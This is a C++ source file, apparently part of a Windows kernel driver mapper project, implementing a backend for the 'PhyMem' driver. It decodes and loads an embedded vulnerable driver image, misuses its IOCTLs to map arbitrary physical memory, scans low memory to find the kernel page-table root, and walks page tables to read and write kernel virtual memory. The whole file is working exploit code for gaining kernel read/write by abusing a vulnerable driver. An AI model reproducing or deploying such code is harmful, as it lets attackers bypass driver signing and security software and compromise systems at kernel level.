#include <kZeroMapper/kZeroMapperConfig.h>

#if defined(KZEROMAPPER_ENABLE_PPA64)

#include "PPA64Backend.h"
#include "../Common/VulnerableDriverLoader.h"
#include "ppa_x64_sys.h"
#include "../DirectIO64/halamd64.h"
#include <algorithm>
#include <vector>

namespace
{
	constexpr DWORD Ppa64MapPhysicalIoctl   = 0x80002000;
	constexpr DWORD Ppa64UnmapPhysicalIoctl = 0x80002004;

	constexpr uint64_t PhysicalAddressMask           = 0x000ffffffffff000ull;
	constexpr uint64_t PhysicalAddressMask2MbPages   = 0x000fffffffe00000ull;
	constexpr uint64_t PhysicalAddressMask1GbPages   = 0x000fffffc0000000ull;
	constexpr uint64_t VirtualAddressMask2MbPages    = 0x00000000001fffffull;
	constexpr uint64_t VirtualAddressMask1GbPages    = 0x000000003fffffffull;
	constexpr uint64_t VirtualAddressMask4KbPages    = 0x0000000000000fffull;
	constexpr uint64_t EntryPageSizeBit              = 0x0000000000000080ull;
	constexpr uint64_t Entry1GbPageSizeBit           = 0x0000000000000080ull;
	constexpr uint64_t EntryPresentBit               = 0x0000000000000001ull;

	ULONG GetProcessorStartBlockCr3Offset( )
	{
		return FIELD_OFFSET( PROCESSOR_START_BLOCK, ProcessorState ) +
			FIELD_OFFSET( KSPECIAL_REGISTERS, Cr3 );
	}

	ULONG ScanLowStubForPml4( const uint8_t* data, ULONG size )
	{
		const auto cr3Offset = GetProcessorStartBlockCr3Offset( );
		const auto lmTargetOffset = FIELD_OFFSET( PROCESSOR_START_BLOCK, LmTarget );
		const auto selfMapOffset = FIELD_OFFSET( PROCESSOR_START_BLOCK, SelfMap );
		constexpr uint64_t maxPhysAddr = 0x10000000000ull;

		for ( ULONG i = 0; i < size; i += 0x1000 )
		{
			__try
			{
				const auto ptr = r_cast<uintptr_t>( data + i );

				if ( ptr + cr3Offset + 8 > r_cast<uintptr_t>( data ) + size )
					break;

				const auto cr3 = *r_cast<const uint64_t*>( ptr + cr3Offset );

				if ( cr3 == 0 || cr3 == 0xFFFFFFFFFFFFFFFFull )
					continue;

				if ( ( cr3 >> 52 ) != 0 )
					continue;

				const auto cr3Page = cr3 & PhysicalAddressMask;
				if ( !cr3Page || cr3Page >= maxPhysAddr )
					continue;

				if ( lmTargetOffset + 8 > 0x1000 )
					continue;

				const auto lmTarget = *r_cast<const uint64_t*>( ptr + lmTargetOffset );

				if ( ( lmTarget & 0xfffff80000000000ull ) != 0xfffff80000000000ull )
					continue;

				if ( selfMapOffset + 8 <= 0x1000 )
				{
					const auto selfMap = *r_cast<const uint64_t*>( ptr + selfMapOffset );
					const auto selfMapPa = selfMap & PhysicalAddressMask;

					if ( selfMapPa == i )
						return i;
				}

				return i;
			}
			__except ( EXCEPTION_EXECUTE_HANDLER )
			{
				continue;
			}
		}

		return 0xFFFFFFFF;
	}

	uint64_t ReadPml4FromLowStub( const uint8_t* data, ULONG offset )
	{
		const auto cr3Offset = GetProcessorStartBlockCr3Offset( );
		return *r_cast<const uint64_t*>( data + offset + cr3Offset );
	}

	bool SafeMemcpy( void* dst, const void* src, size_t size )
	{
		__try
		{
			memcpy( dst, src, size );
			return true;
		}
		__except ( EXCEPTION_EXECUTE_HANDLER )
		{
			return false;
		}
	}
}

std::string PPA64Backend::Name( ) const
{
	return pstra( "PPA64" );
}

NTSTATUS PPA64Backend::Load( )
{
	const auto status = KernelRwCallBackend::Load( );

	if ( status != STATUS_SUCCESS )
		return status;

	if ( !m_NtUserSetGestureConfigRef )
	{
		LOG_SEC( "[-] - [PPA64] NtUserSetGestureConfig_ref not found" );
		return 0x9170;
	}

	return STATUS_SUCCESS;
}

NTSTATUS PPA64Backend::LoadDevice( )
{
	auto image = Tools::DecodePEBuffer( ppa_x64_sys, sizeof( ppa_x64_sys ) );

	return DropLoadAndOpenMapperDriver( Name( ).c_str( ), pstrw( L"\\\\.\\PhyMem" ),
		image.data( ), image.size( ), &m_Device, 0x91A0, pstra( "PhyMem" ) );
}

NTSTATUS PPA64Backend::UnloadDevice( )
{
	CloseMapperDevice( &m_Device );
	return UnloadMapperDriver( pstra( "PhyMem" ) );
}

bool PPA64Backend::MapPhysical( uint64_t physicalAddress, uint32_t size, uint64_t* virtualAddress )
{
	if ( !virtualAddress || !size )
		return false;

	*virtualAddress = 0;

	MapPhysicalRequest request {};
	request.PhysicalAddress = physicalAddress;
	request.Size = size;

	uint64_t mappedVa = 0;
	DWORD bytesReturned = 0;

	if ( !DeviceIoControl( m_Device, Ppa64MapPhysicalIoctl, &request, sizeof( request ), &mappedVa, sizeof( mappedVa ), &bytesReturned, nullptr ) )
	{
		LOG_SEC( "[-] - [PPA64] MapPhysical failed pa=0x%llx size=0x%X gle=%lu", physicalAddress, size, GetLastError( ) );
		return false;
	}

	*virtualAddress = mappedVa;
	return *virtualAddress != 0;
}

bool PPA64Backend::UnmapPhysical( uint64_t virtualAddress, uint32_t size )
{
	if ( !virtualAddress || !size )
		return false;

	MapPhysicalRequest request {};
	request.PhysicalAddress = virtualAddress;
	request.Size = size;

	DWORD bytesReturned = 0;

	return DeviceIoControl( m_Device, Ppa64UnmapPhysicalIoctl, &request, sizeof( request ), nullptr, 0, &bytesReturned, nullptr ) != FALSE;
}

bool PPA64Backend::ReadWritePhysical( uint64_t physicalAddress, void* buffer, uint32_t bytes, bool write )
{
	if ( !buffer || !bytes )
		return false;

	constexpr uint64_t maxRamPa = 0x10000000000ull;

	if ( physicalAddress >= maxRamPa )
		return false;

	const auto pageOffset = physicalAddress & 0xFFF;
	const auto alignedPa = physicalAddress & ~0xFFFull;
	const auto mapSize = s_cast<uint32_t>( ( pageOffset + bytes + 0xFFF ) & ~0xFFFull );

	uint64_t mappedVa = 0;

	if ( !MapPhysical( alignedPa, mapSize, &mappedVa ) )
		return false;

	bool result = false;

	const auto ptr = r_cast<uint8_t*>( mappedVa ) + pageOffset;

	if ( write )
		result = SafeMemcpy( ptr, buffer, bytes );
	else
		result = SafeMemcpy( buffer, ptr, bytes );

	if ( !result )
		LOG_SEC( "[-] - [PPA64] ReadWritePhysical exception pa=0x%llx size=0x%X write=%d", physicalAddress, bytes, write ? 1 : 0 );

	UnmapPhysical( mappedVa, mapSize );
	return result;
}

	bool PPA64Backend::QueryPml4( uint64_t* value )
{
	if ( !value )
		return false;

	*value = 0;

	const ULONG mapSize = 0x1000000;
	uint64_t mappedVa = 0;

	if ( !MapPhysical( 0, mapSize, &mappedVa ) )
	{
		LOG_SEC( "[-] - [PPA64] QueryPml4 failed to map low 16MB gle=%lu", GetLastError( ) );
		return false;
	}

	std::vector<uint8_t> lowMemory( mapSize );

	bool readOk = SafeMemcpy( lowMemory.data( ), r_cast<const void*>( mappedVa ), mapSize );

	if ( !readOk )
		LOG_SEC( "[-] - [PPA64] QueryPml4 exception reading mapped low memory", 0 );

	UnmapPhysical( mappedVa, mapSize );

	if ( !readOk )
		return false;

	const auto stubOffset = ScanLowStubForPml4( lowMemory.data( ), mapSize );

	if ( stubOffset != 0xFFFFFFFF )
	{
		*value = ReadPml4FromLowStub( lowMemory.data( ), stubOffset );
		LOG_SEC( "[*] - [PPA64] QueryPml4 found pml4=0x%llx lowStubOffset=0x%X", *value, stubOffset );
		return true;
	}

	LOG_SEC( "[*] - [PPA64] Low stub scan failed, scanning low 1MB for CR3 candidates", 0 );

	const uint64_t validationVa = m_Ntoskrnl;
	if ( !validationVa )
	{
		LOG_SEC( "[-] - [PPA64] No validation VA (ntoskrnl=0)", 0 );
		return false;
	}

	constexpr uint64_t maxValidPa = 0x10000000000ull;
	const auto p = r_cast<const uint64_t*>( lowMemory.data( ) );
	const size_t qwordCount = mapSize / sizeof( uint64_t );

	ULONG tested = 0;
	for ( size_t i = 0; i < qwordCount; ++i )
	{
		const auto candidate = p[ i ];

		if ( candidate == 0 || candidate == 0xFFFFFFFFFFFFFFFFull )
			continue;

		if ( ( candidate >> 52 ) != 0 )
			continue;

		const auto candidatePa = candidate & PhysicalAddressMask;
		if ( !candidatePa || candidatePa >= maxValidPa )
			continue;

		if ( candidatePa == 0 || candidatePa < 0x1000 )
			continue;

		uint64_t testPa = 0;
		if ( !VirtualToPhysicalWithCr3( candidate, validationVa, &testPa ) )
			continue;

		++tested;

		if ( testPa == 0 || testPa >= maxValidPa )
			continue;

		uint16_t mz = 0;
		if ( !ReadWritePhysical( testPa, &mz, sizeof( mz ), false ) )
			continue;

		if ( mz != 0x5A4D )
			continue;

		*value = candidate;
		LOG_SEC( "[*] - [PPA64] QueryPml4 found pml4=0x%llx at offset=0x%llx (testPa=0x%llx mz=0x%X tested=%lu)",
			*value, i * 8, testPa, mz, tested );
		return true;
	}

	LOG_SEC( "[-] - [PPA64] QueryPml4 failed to find PML4 (tested=%lu candidates)", tested );
	return false;
}

bool PPA64Backend::PageEntryToPhysicalAddress( uint64_t entry, uint64_t* physicalAddress )
{
	if ( entry & EntryPresentBit )
	{
		*physicalAddress = entry & PhysicalAddressMask;
		return true;
	}

	return false;
}

bool PPA64Backend::VirtualToPhysicalWithCr3( uint64_t cr3, uint64_t virtualAddress, uint64_t* physicalAddress )
{
	if ( !physicalAddress )
		return false;

	*physicalAddress = 0;

	auto table = cr3 & PhysicalAddressMask;
	uint64_t entry = 0;

	for ( int r = 0; r < 4; r++ )
	{
		const auto shift = 39 - ( r * 9 );
		const auto selector = ( virtualAddress >> shift ) & 0x1ff;

		if ( !ReadWritePhysical( table + selector * sizeof( uint64_t ), &entry, sizeof( entry ), false ) )
			return false;

		if ( !PageEntryToPhysicalAddress( entry, &table ) )
			return false;

		if ( r == 1 && ( entry & Entry1GbPageSizeBit ) )
		{
			table &= PhysicalAddressMask1GbPages;
			table += virtualAddress & VirtualAddressMask1GbPages;
			*physicalAddress = table;
			return true;
		}

		if ( r == 2 && ( entry & EntryPageSizeBit ) )
		{
			table &= PhysicalAddressMask2MbPages;
			table += virtualAddress & VirtualAddressMask2MbPages;
			*physicalAddress = table;
			return true;
		}
	}

	table += virtualAddress & VirtualAddressMask4KbPages;
	*physicalAddress = table;
	return true;
}

bool PPA64Backend::VirtualToPhysicalByTableWalk( uint64_t virtualAddress, uint64_t* physicalAddress )
{
	if ( !physicalAddress )
		return false;

	uint64_t pml4 = 0;

	if ( !QueryPml4( &pml4 ) )
	{
		LOG_SEC( "[-] - [PPA64] VirtualToPhysicalByTableWalk failed QueryPml4 va=0x%llx", virtualAddress );
		return false;
	}

	if ( !VirtualToPhysicalWithCr3( pml4, virtualAddress, physicalAddress ) )
	{
		LOG_SEC( "[-] - [PPA64] VirtualToPhysicalByTableWalk failed va=0x%llx pml4=0x%llx", virtualAddress, pml4 );
		return false;
	}

	LOG_SEC( "[*] - [PPA64] VirtualToPhysicalByTableWalk va=0x%llx pa=0x%llx pml4=0x%llx", virtualAddress, *physicalAddress, pml4 );
	return true;
}

bool PPA64Backend::ReadWriteVirtual( uint64_t address, void* buffer, size_t size, bool write )
{
	auto bytes = r_cast<uint8_t*>( buffer );
	size_t offset = 0;

	while ( offset < size )
	{
		uint64_t physical = 0;
		const auto currentAddress = address + offset;
		const auto pageLeft = 0x1000 - ( currentAddress & 0xFFF );
		const auto chunk = s_cast<uint32_t>( std::min<size_t>( pageLeft, size - offset ) );

		if ( !VirtualToPhysicalByTableWalk( currentAddress, &physical ) )
			return false;

		if ( !ReadWritePhysical( physical, bytes + offset, chunk, write ) )
			return false;

		offset += chunk;
	}

	return true;
}

bool PPA64Backend::ReadMemory( uint64_t address, void* buffer, size_t size )
{
	const auto result = ReadWriteVirtual( address, buffer, size, false );

	if ( !result )
		LOG_SEC( "[-] - [PPA64] ReadMemory failed va=0x%llx size=0x%llx", address, size );

	return result;
}

bool PPA64Backend::WriteMemory( uint64_t address, const void* buffer, size_t size )
{
	const auto result = ReadWriteVirtual( address, const_cast<void*>( buffer ), size, true );

	if ( !result )
		LOG_SEC( "[-] - [PPA64] WriteMemory failed va=0x%llx size=0x%llx", address, size );

	return result;
}




#endif // KZEROMAPPER_ENABLE_PPA64